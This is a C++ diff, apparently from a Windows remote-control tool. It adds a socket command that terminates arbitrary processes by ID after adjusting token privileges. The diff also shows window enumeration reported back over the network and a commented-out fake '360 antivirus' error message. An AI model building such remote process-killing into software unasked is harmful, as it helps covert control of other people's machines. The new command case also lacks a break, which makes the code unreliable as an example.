@@ -5,17 +5,13 @@ int bufferSize = 0;
 int windowCount = 0;
 bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
 {
-
-	char	strTitle[1024];
-	memset(strTitle, 0, sizeof(strTitle));
-	GetWindowText(hwnd, strTitle, sizeof(strTitle));
-
 	char *lpBuffer = (char *)lParam;
 	LPWindowInfo lpWindowInfo = new WindowInfo;
 	memset(lpWindowInfo->strTitle, 0, sizeof(lpWindowInfo->strTitle));
 	GetWindowText(hwnd, lpWindowInfo->strTitle , 512);
 	if (!IsWindowVisible(hwnd) || strlen(lpWindowInfo->strTitle) == 0)
 	return true;
+	lpWindowInfo->dwProcessID = 0;
 	GetWindowThreadProcessId(hwnd, &lpWindowInfo->dwProcessID);
 
 	memcpy(lpBuffer + bufferSize, lpWindowInfo, sizeof(WindowInfo));
@@ -40,6 +36,38 @@ void getWindowList(SOCKET windowManagerSocket, LPMsgHead lpMsgHead){
 	delete lpBuffer;
 }
 
+bool DebugPrivilege(const char *PName,BOOL bEnable)
+{
+	BOOL              bResult = TRUE;
+	HANDLE            hToken;
+	TOKEN_PRIVILEGES  TokenPrivileges;
+
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
+	{
+		bResult = FALSE;
+		return bResult;
+	}
+	TokenPrivileges.PrivilegeCount = 1;
+	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
+
+	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
+	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
+	if (GetLastError() != ERROR_SUCCESS)
+	{
+		bResult = FALSE;
+	}
+
+	CloseHandle(hToken);
+	return bResult;	
+}
+
+void deleteWindow(int id){
+	    DebugPrivilege(SE_SHUTDOWN_NAME,TRUE);
+		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
+		TerminateProcess(hProcess, 0);
+		CloseHandle(hProcess);
+		DebugPrivilege(SE_SHUTDOWN_NAME, FALSE);
+}
 
 
 void windowManager(){
@@ -84,6 +112,10 @@ void windowManager(){
 				getWindowList(windowManagerSocket, &msgHead);
 			}
 			break;
+		case CMD_WINDOW_DELETE:
+			{
+				deleteWindow(msgHead.dwExtend1);
+		    }
 		default:
 			{
 				//::MessageBox(NULL,"您的360出现问题！", "您的360出现问题！", MB_OK);
